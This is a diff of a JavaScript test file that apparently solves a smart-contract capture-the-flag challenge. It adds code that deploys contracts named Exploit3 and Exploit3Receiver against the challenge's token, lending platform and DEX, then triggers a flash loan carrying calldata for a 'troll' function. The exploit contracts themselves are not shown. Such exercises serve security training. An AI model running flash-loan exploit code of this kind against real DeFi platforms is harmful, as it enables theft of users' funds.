@@ -143,7 +143,39 @@ describe("Solve Challenge 3", function () {
         ///////////////////////////////////////////////////
 
         //======= COMPLETE THIS SECTION AS YOU REQUIRE =======
+        const exploit3Factory = await ethers.getContractFactory("Exploit3");
+        const exploit3ReceiverFactory = (
+            await ethers.getContractFactory("Exploit3Receiver")
+        );
+    
+        const exploit3Receiver = (
+            await exploit3ReceiverFactory
+            .connect(challenger)
+            .deploy()
+        );
+    
+        const exploit3 = (
+            await exploit3Factory
+            .connect(challenger)
+            .deploy(
+                isecToken.address,
+                boringToken.address,
+                lendingPlatform.address,
+                dex.address,
+                challengerAddress
+            )
+        );
+    
+        await exploit3.deployed();
 
+        let calldata = await exploit3Receiver.interface.encodeFunctionData(
+            "troll",[exploit3.address, isecToken.address]
+        );
+        
+        await pool.flashLoan(
+            exploit3Receiver.address,
+            calldata
+        );
         //====================================================
 
         ///////////////////////////////////////////////////
